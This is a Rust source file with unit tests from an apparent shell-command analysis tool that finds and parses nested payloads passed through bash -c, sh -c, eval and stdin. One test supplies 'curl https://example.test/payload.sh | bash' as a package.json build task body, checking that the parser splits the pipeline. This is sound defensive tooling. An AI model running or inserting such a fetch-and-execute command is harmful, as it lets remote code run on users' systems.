use caushell_parse::{ParseError, ParsedCommandArtifact, SourceSpan, parse_command};
use caushell_types::ShellKind;

use crate::{
    BoundArgumentMaterialization, BoundInvocation, BoundValue, ImplicitInputSource,
    PayloadLanguage, PayloadSource, SemanticType, SlotName,
};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RecursivePayloadOrigin {
    Parameter {
        slot: SlotName,
    },
    FormImplicitInput,
    ConfigDefinedTask {
        config_path: String,
        task_name: String,
    },
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RecursivePayloadArgumentFragment {
    pub text: String,
    pub quoted: bool,
    pub node_kind: String,
    pub span: SourceSpan,
    pub materialization: RecursivePayloadFragmentMaterialization,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RecursivePayloadFragmentMaterialization {
    Literal,
    ResolvedExactScalar { variable_name: String },
    ResolvedRuntimeProduced { variable_name: String },
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RecursivePayloadInput {
    ArgumentFragments {
        fragments: Vec<RecursivePayloadArgumentFragment>,
    },
    ImplicitInput {
        source: ImplicitInputSource,
    },
    LiteralText {
        text: String,
    },
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RecursivePayloadCandidate {
    pub language: PayloadLanguage,
    pub source: PayloadSource,
    pub origin: RecursivePayloadOrigin,
    pub input: RecursivePayloadInput,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedRecursivePayload {
    pub candidate: RecursivePayloadCandidate,
    pub shell_kind: ShellKind,
    pub artifact: ParsedCommandArtifact,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RecursivePayloadParseResult {
    Parsed(ParsedRecursivePayload),
    RequiresRuntimeInput {
        candidate: RecursivePayloadCandidate,
    },
    UnsupportedLanguage {
        candidate: RecursivePayloadCandidate,
    },
    ParseFailed {
        candidate: RecursivePayloadCandidate,
        shell_kind: ShellKind,
        error: ParseError,
    },
}

pub fn collect_recursive_payload_candidates(
    invocation: &BoundInvocation,
) -> Vec<RecursivePayloadCandidate> {
    let mut candidates = Vec::new();

    for parameter in &invocation.bound_parameters {
        let Some((language, source)) = recursive_payload_semantic(&parameter.semantic) else {
            continue;
        };

        let mut fragments = Vec::new();

        for value in &parameter.values {
            match value {
                BoundValue::Argument {
                    text,
                    quoted,
                    node_kind,
                    span,
                    materialization,
                    ..
                } => fragments.push(RecursivePayloadArgumentFragment {
                    text: text.clone(),
                    quoted: *quoted,
                    node_kind: node_kind.clone(),
                    span: span.clone(),
                    materialization: match materialization {
                        BoundArgumentMaterialization::Literal => {
                            RecursivePayloadFragmentMaterialization::Literal
                        }
                        BoundArgumentMaterialization::ResolvedExactScalar { variable_name } => {
                            RecursivePayloadFragmentMaterialization::ResolvedExactScalar {
                                variable_name: variable_name.clone(),
                            }
                        }
                        BoundArgumentMaterialization::ResolvedRuntimeProduced { variable_name } => {
                            RecursivePayloadFragmentMaterialization::ResolvedRuntimeProduced {
                                variable_name: variable_name.clone(),
                            }
                        }
                    },
                }),
                BoundValue::ImplicitInput {
                    source: implicit_source,
                } => {
                    candidates.push(RecursivePayloadCandidate {
                        language,
                        source,
                        origin: RecursivePayloadOrigin::Parameter {
                            slot: parameter.name.clone(),
                        },
                        input: RecursivePayloadInput::ImplicitInput {
                            source: *implicit_source,
                        },
                    });
                }
            }
        }

        if !fragments.is_empty() {
            candidates.push(RecursivePayloadCandidate {
                language,
                source,
                origin: RecursivePayloadOrigin::Parameter {
                    slot: parameter.name.clone(),
                },
                input: RecursivePayloadInput::ArgumentFragments { fragments },
            });
        }
    }

    for implicit_input in &invocation.bound_implicit_inputs {
        let Some((language, source)) = recursive_payload_semantic(&implicit_input.semantic) else {
            continue;
        };

        candidates.push(RecursivePayloadCandidate {
            language,
            source,
            origin: RecursivePayloadOrigin::FormImplicitInput,
            input: RecursivePayloadInput::ImplicitInput {
                source: implicit_input.source,
            },
        });
    }

    candidates
}

pub fn parse_recursive_payload_candidate(
    candidate: &RecursivePayloadCandidate,
) -> RecursivePayloadParseResult {
    match &candidate.input {
        RecursivePayloadInput::LiteralText { text } => {
            let Some(shell_kind) = shell_kind_for_payload_language(candidate.language) else {
                return RecursivePayloadParseResult::UnsupportedLanguage {
                    candidate: candidate.clone(),
                };
            };

            match parse_command(text, shell_kind) {
                Ok(artifact) => RecursivePayloadParseResult::Parsed(ParsedRecursivePayload {
                    candidate: candidate.clone(),
                    shell_kind,
                    artifact,
                }),
                Err(error) => RecursivePayloadParseResult::ParseFailed {
                    candidate: candidate.clone(),
                    shell_kind,
                    error,
                },
            }
        }
        RecursivePayloadInput::ArgumentFragments { fragments } => {
            let Some(shell_kind) = shell_kind_for_payload_language(candidate.language) else {
                return RecursivePayloadParseResult::UnsupportedLanguage {
                    candidate: candidate.clone(),
                };
            };

            let text = joined_recursive_payload_text(fragments);

            match parse_command(&text, shell_kind) {
                Ok(artifact) => RecursivePayloadParseResult::Parsed(ParsedRecursivePayload {
                    candidate: candidate.clone(),
                    shell_kind,
                    artifact,
                }),
                Err(error) => RecursivePayloadParseResult::ParseFailed {
                    candidate: candidate.clone(),
                    shell_kind,
                    error,
                },
            }
        }
        RecursivePayloadInput::ImplicitInput { .. } => {
            RecursivePayloadParseResult::RequiresRuntimeInput {
                candidate: candidate.clone(),
            }
        }
    }
}

pub fn parse_recursive_payload_candidates(
    invocation: &BoundInvocation,
) -> Vec<RecursivePayloadParseResult> {
    let candidates = collect_recursive_payload_candidates(invocation);

    candidates
        .iter()
        .map(parse_recursive_payload_candidate)
        .collect()
}

fn recursive_payload_semantic(semantic: &SemanticType) -> Option<(PayloadLanguage, PayloadSource)> {
    match semantic {
        SemanticType::Payload(semantic) if semantic.recursive => {
            Some((semantic.language, semantic.source))
        }
        _ => None,
    }
}

fn shell_kind_for_payload_language(language: PayloadLanguage) -> Option<ShellKind> {
    match language {
        PayloadLanguage::Bash => Some(ShellKind::Bash),
        PayloadLanguage::Sh => Some(ShellKind::Sh),
        PayloadLanguage::Dash
        | PayloadLanguage::Python
        | PayloadLanguage::Perl
        | PayloadLanguage::Javascript => None,
    }
}

pub fn joined_recursive_payload_text(fragments: &[RecursivePayloadArgumentFragment]) -> String {
    fragments
        .iter()
        .map(|fragment| fragment.text.as_str())
        .collect::<Vec<_>>()
        .join(" ")
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use caushell_parse::{SourceSpan, parse_command};
    use caushell_types::ShellKind;

    use super::{
        RecursivePayloadArgumentFragment, RecursivePayloadCandidate, RecursivePayloadInput,
        RecursivePayloadOrigin, RecursivePayloadParseResult, collect_recursive_payload_candidates,
        joined_recursive_payload_text, parse_recursive_payload_candidate,
        parse_recursive_payload_candidates,
    };
    use crate::{
        ArgumentBindingSource, BoundInvocation, BoundParameter, BoundValue, CommandName,
        CommandProfile, FormId, ImplicitInputSource, InvocationRuntimeContext, PayloadLanguage,
        PayloadSemantic, PayloadSource, ProfileRegistry, RecursivePayloadFragmentMaterialization,
        ResolveInvocationResult, SemanticType, SlotName, bind_invocation,
        collect_dispatch_command_candidates, load_command_profile_from_path, project_invocation,
        resolve_invocation, select_invocation,
    };

    fn built_in_profile(name: &str) -> CommandProfile {
        let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
        let profile_path = manifest_dir.join("profiles").join(format!("{name}.yaml"));

        load_command_profile_from_path(&profile_path).expect("expected built-in profile to load")
    }

    fn built_in_registry() -> ProfileRegistry {
        ProfileRegistry::built_in().expect("expected built-in registry to load")
    }

    fn empty_span() -> SourceSpan {
        SourceSpan {
            start_byte: 0,
            end_byte: 0,
            start_row: 0,
            start_column: 0,
            end_row: 0,
            end_column: 0,
        }
    }

    #[test]
    fn collects_command_string_argument_candidate() {
        let profile = built_in_profile("bash");
        let artifact = parse_command(r#"bash -c 'echo ok'"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let candidates = collect_recursive_payload_candidates(&bound);

        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].language, PayloadLanguage::Bash);
        assert_eq!(candidates[0].source, PayloadSource::InlineString);
        assert_eq!(
            candidates[0].origin,
            RecursivePayloadOrigin::Parameter {
                slot: SlotName::new("payload"),
            }
        );

        match &candidates[0].input {
            RecursivePayloadInput::ArgumentFragments { fragments } => {
                assert_eq!(fragments.len(), 1);
                assert_eq!(fragments[0].text, "echo ok");
                assert!(fragments[0].quoted);
                assert_eq!(fragments[0].node_kind, "raw_string");
            }
            other => panic!("unexpected recursive payload input: {other:?}"),
        }
    }

    #[test]
    fn collects_joined_argument_fragments_as_one_candidate() {
        let payload_semantic = SemanticType::Payload(PayloadSemantic {
            language: PayloadLanguage::Bash,
            source: PayloadSource::InlineString,
            recursive: true,
        });
        let bound = BoundInvocation::new(CommandName::new("eval"), FormId::new("joined_payload"))
            .with_bound_parameter(
                BoundParameter::new(SlotName::new("payload"), payload_semantic)
                    .with_value(BoundValue::argument(
                        "$LEFT",
                        true,
                        empty_span(),
                        ArgumentBindingSource::RemainingArg,
                    ))
                    .with_value(BoundValue::argument(
                        "$RIGHT",
                        true,
                        empty_span(),
                        ArgumentBindingSource::RemainingArg,
                    )),
            );

        let candidates = collect_recursive_payload_candidates(&bound);

        assert_eq!(candidates.len(), 1);
        match &candidates[0].input {
            RecursivePayloadInput::ArgumentFragments { fragments } => {
                assert_eq!(fragments.len(), 2);
                assert_eq!(fragments[0].text, "$LEFT");
                assert_eq!(fragments[1].text, "$RIGHT");
            }
            other => panic!("unexpected recursive payload input: {other:?}"),
        }
    }

    #[test]
    fn collects_stdin_implicit_candidate() {
        let profile = built_in_profile("bash");
        let artifact =
            parse_command("bash -s", ShellKind::Bash).expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let candidates = collect_recursive_payload_candidates(&bound);

        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].language, PayloadLanguage::Bash);
        assert_eq!(candidates[0].source, PayloadSource::Stdin);
        assert_eq!(
            candidates[0].origin,
            RecursivePayloadOrigin::FormImplicitInput
        );

        match &candidates[0].input {
            RecursivePayloadInput::ImplicitInput { source } => {
                assert_eq!(*source, ImplicitInputSource::StdinPayload);
            }
            other => panic!("unexpected recursive payload input: {other:?}"),
        }
    }

    #[test]
    fn collects_interactive_implicit_candidate() {
        let profile = built_in_profile("bash");
        let artifact = parse_command("bash", ShellKind::Bash).expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(
            command,
            InvocationRuntimeContext::new().with_interactive_session(),
        );
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let candidates = collect_recursive_payload_candidates(&bound);

        assert_eq!(candidates.len(), 1);
        assert_eq!(candidates[0].language, PayloadLanguage::Bash);
        assert_eq!(candidates[0].source, PayloadSource::Interactive);
        assert_eq!(
            candidates[0].origin,
            RecursivePayloadOrigin::FormImplicitInput
        );

        match &candidates[0].input {
            RecursivePayloadInput::ImplicitInput { source } => {
                assert_eq!(*source, ImplicitInputSource::InteractiveSession);
            }
            other => panic!("unexpected recursive payload input: {other:?}"),
        }
    }

    #[test]
    fn ignores_non_payload_bindings() {
        let profile = built_in_profile("bash");
        let artifact = parse_command(r#"bash ./scripts/build.sh"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let candidates = collect_recursive_payload_candidates(&bound);

        assert!(candidates.is_empty());
    }

    #[test]
    fn parse_recursive_payload_candidate_parses_inline_argument() {
        let profile = built_in_profile("bash");
        let artifact = parse_command(r#"bash -c 'echo ok'"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);
        let candidates = collect_recursive_payload_candidates(&bound);

        let result = parse_recursive_payload_candidate(&candidates[0]);

        match result {
            RecursivePayloadParseResult::Parsed(parsed) => {
                assert_eq!(parsed.shell_kind, ShellKind::Bash);
                assert_eq!(parsed.candidate.language, PayloadLanguage::Bash);
                assert_eq!(parsed.candidate.source, PayloadSource::InlineString);
                assert_eq!(
                    parsed.candidate.origin,
                    RecursivePayloadOrigin::Parameter {
                        slot: SlotName::new("payload"),
                    }
                );
                assert_eq!(parsed.artifact.commands.len(), 1);
                assert_eq!(
                    parsed.artifact.commands[0].command_name.as_deref(),
                    Some("echo")
                );
            }
            other => panic!("unexpected recursive parse result: {other:?}"),
        }
    }

    #[test]
    fn parse_recursive_payload_candidate_parses_literal_config_task_body() {
        let candidate = RecursivePayloadCandidate {
            language: PayloadLanguage::Sh,
            source: PayloadSource::InlineString,
            origin: RecursivePayloadOrigin::ConfigDefinedTask {
                config_path: "/tmp/project/package.json".to_string(),
                task_name: "build".to_string(),
            },
            input: RecursivePayloadInput::LiteralText {
                text: "curl https://example.test/payload.sh | bash".to_string(),
            },
        };

        let result = parse_recursive_payload_candidate(&candidate);

        match result {
            RecursivePayloadParseResult::Parsed(parsed) => {
                assert_eq!(parsed.shell_kind, ShellKind::Sh);
                assert_eq!(parsed.candidate, candidate);
                assert_eq!(parsed.artifact.commands.len(), 2);
                assert_eq!(
                    parsed.artifact.commands[0].command_name.as_deref(),
                    Some("curl")
                );
                assert_eq!(
                    parsed.artifact.commands[1].command_name.as_deref(),
                    Some("bash")
                );
            }
            other => panic!("unexpected recursive parse result: {other:?}"),
        }
    }

    #[test]
    fn parse_recursive_payload_candidates_marks_stdin_as_requires_runtime_input() {
        let profile = built_in_profile("bash");
        let artifact =
            parse_command("bash -s", ShellKind::Bash).expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let results = parse_recursive_payload_candidates(&bound);

        assert_eq!(results.len(), 1);

        match &results[0] {
            RecursivePayloadParseResult::RequiresRuntimeInput { candidate } => {
                assert_eq!(candidate.language, PayloadLanguage::Bash);
                assert_eq!(candidate.source, PayloadSource::Stdin);
                assert_eq!(candidate.origin, RecursivePayloadOrigin::FormImplicitInput);

                match &candidate.input {
                    RecursivePayloadInput::ImplicitInput { source } => {
                        assert_eq!(*source, ImplicitInputSource::StdinPayload);
                    }
                    other => panic!("unexpected recursive payload input: {other:?}"),
                }
            }
            other => panic!("unexpected recursive parse result: {other:?}"),
        }
    }

    #[test]
    fn parse_recursive_payload_candidate_marks_unsupported_language() {
        let candidate = RecursivePayloadCandidate {
            language: PayloadLanguage::Python,
            source: PayloadSource::InlineString,
            origin: RecursivePayloadOrigin::Parameter {
                slot: SlotName::new("payload"),
            },
            input: RecursivePayloadInput::ArgumentFragments {
                fragments: vec![RecursivePayloadArgumentFragment {
                    text: "print('ok')".to_string(),
                    quoted: true,
                    node_kind: "string".to_string(),
                    span: empty_span(),
                    materialization: RecursivePayloadFragmentMaterialization::Literal,
                }],
            },
        };

        let result = parse_recursive_payload_candidate(&candidate);

        assert_eq!(
            result,
            RecursivePayloadParseResult::UnsupportedLanguage { candidate }
        );
    }

    #[test]
    fn node_eval_collects_javascript_payload_as_unsupported_language() {
        let profile = built_in_profile("node");
        let artifact = parse_command(r#"node -e 'console.log(1)'"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let results = parse_recursive_payload_candidates(&bound);

        assert_eq!(results.len(), 1);
        match &results[0] {
            RecursivePayloadParseResult::UnsupportedLanguage { candidate } => {
                assert_eq!(candidate.language, PayloadLanguage::Javascript);
                assert_eq!(candidate.source, PayloadSource::InlineString);
            }
            other => panic!("unexpected parse result: {other:?}"),
        }
    }

    #[test]
    fn python_stdin_collects_runtime_payload_candidate() {
        let profile = built_in_profile("python");
        let artifact = parse_command("python", ShellKind::Bash).expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(
            command,
            InvocationRuntimeContext::new().with_stdin_payload_available(),
        );
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let results = parse_recursive_payload_candidates(&bound);

        assert_eq!(results.len(), 1);
        match &results[0] {
            RecursivePayloadParseResult::RequiresRuntimeInput { candidate } => {
                assert_eq!(candidate.language, PayloadLanguage::Python);
                assert_eq!(candidate.source, PayloadSource::Stdin);
            }
            other => panic!("unexpected parse result: {other:?}"),
        }
    }

    #[test]
    fn dispatch_resolved_child_command_can_feed_recursive_payload_parsing() {
        let registry = built_in_registry();
        let profile = built_in_profile("sudo");
        let artifact = parse_command(r#"sudo --user=root sh -c 'echo ok'"#, ShellKind::Bash)
            .expect("expected parse to succeed");

        let command = artifact.commands.first().expect("expected one command");
        let projection = project_invocation(command, InvocationRuntimeContext::new());
        let selection =
            select_invocation(&profile, &projection).expect("expected successful selection");
        let bound = bind_invocation(&profile, &projection, &selection);

        let candidates = collect_dispatch_command_candidates(&bound);
        assert_eq!(candidates.len(), 1);

        let child_command = candidates[0].to_command_fact();
        let child_resolved =
            resolve_invocation(&registry, &child_command, InvocationRuntimeContext::new());

        let child_bound = match child_resolved {
            ResolveInvocationResult::Resolved(resolved) => {
                assert_eq!(resolved.normalized_command_name, "sh");
                assert_eq!(resolved.selection.form.id.as_str(), "command_string");
                resolved.bound
            }
            other => panic!("unexpected child resolve result: {other:?}"),
        };

        let nested_candidates = collect_recursive_payload_candidates(&child_bound);
        assert_eq!(nested_candidates.len(), 1);
        assert_eq!(nested_candidates[0].language, PayloadLanguage::Sh);
        assert_eq!(nested_candidates[0].source, PayloadSource::InlineString);
        assert_eq!(
            nested_candidates[0].origin,
            RecursivePayloadOrigin::Parameter {
                slot: SlotName::new("payload"),
            }
        );

        let nested_parsed = parse_recursive_payload_candidate(&nested_candidates[0]);

        match nested_parsed {
            RecursivePayloadParseResult::Parsed(parsed) => {
                assert_eq!(parsed.shell_kind, ShellKind::Sh);
                assert_eq!(parsed.artifact.commands.len(), 1);
                assert_eq!(
                    parsed.artifact.commands[0].command_name.as_deref(),
                    Some("echo")
                );
            }
            other => panic!("unexpected nested payload parse result: {other:?}"),
        }
    }

    #[test]
    fn joined_recursive_payload_text_joins_fragments_with_spaces() {
        let text = joined_recursive_payload_text(&[
            RecursivePayloadArgumentFragment {
                text: "echo ok".to_string(),
                quoted: true,
                node_kind: "string".to_string(),
                span: empty_span(),
                materialization: RecursivePayloadFragmentMaterialization::Literal,
            },
            RecursivePayloadArgumentFragment {
                text: "&& pwd".to_string(),
                quoted: true,
                node_kind: "string".to_string(),
                span: empty_span(),
                materialization: RecursivePayloadFragmentMaterialization::Literal,
            },
        ]);

        assert_eq!(text, "echo ok && pwd");
    }
}
